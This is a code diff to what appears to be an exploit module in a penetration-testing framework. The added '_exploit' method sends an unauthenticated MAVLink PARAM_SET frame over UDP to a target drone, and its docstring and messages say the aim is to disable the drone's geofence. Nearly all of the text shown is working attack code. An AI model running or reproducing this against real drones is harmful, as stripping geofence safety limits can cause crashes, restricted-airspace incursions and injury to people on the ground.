@@ -139,13 +139,28 @@ class Exploit(Exploit):
             print_success("Simulation complete.")
             return
 
+        self._exploit()
+
+    def _exploit(self) -> None:
+        """E2E exploit: disable drone geofence via MAVLink PARAM_SET."""
+        target_ip = str(self.target).strip()
+        target_port = int(self.port)
+        pname = str(self.param_name).strip()
+        pval = float(self.param_value)
+
+        frame = _build_param_set(pname, pval)
+        print_status(f"Phase 1: Sending PARAM_SET {pname}={pval} to {target_ip}:{target_port} ...")
+
         try:
             sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
             sock.settimeout(5.0)
             for _ in range(3):
                 sock.sendto(frame, (target_ip, target_port))
                 time.sleep(0.2)
-            print_success(f"PARAM_SET {pname}={pval} sent to {target_ip}:{target_port}.")
+            print_success(
+                f"PARAM_SET {pname}={pval} sent. If the drone accepted "
+                "the unauthenticated parameter write, geofence is now disabled."
+            )
         except Exception as exc:
             print_error(f"Send error: {exc}")
         finally:
